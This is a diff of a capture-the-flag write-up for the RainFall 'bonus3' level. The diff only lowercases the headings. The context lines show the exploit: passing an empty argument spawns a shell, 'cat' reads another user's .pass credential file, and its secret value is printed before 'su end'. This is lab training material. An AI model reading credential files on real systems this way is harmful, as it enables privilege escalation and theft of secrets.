@@ -1,6 +1,6 @@
-# Bonus3
+# bonus3
 
-## Exploring the binary
+## exploring the binary
 ```shell
 bonus3@RainFall:~$ ./bonus3
 bonus3@RainFall:~$ echo $?
@@ -109,7 +109,7 @@ Later on, there is a call to <code>strcmp()</code>, which checks if the result o
 
 This means that we just need to figure out what value to pass to the binary so that the two variables are the same. The simplest solution is apparently passing <code>NULL</code>, so that both strings are empty.
 
-## Exploit
+## exploit
 ``` shell
 bonus3@RainFall:~$ ./bonus3 ""
 $ whoami
@@ -118,7 +118,7 @@ $ cat /home/user/end/.pass
 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
 ```
 
-## The end
+## the end
 ``` shell
 bonus3@RainFall:~$ su end
 Password:
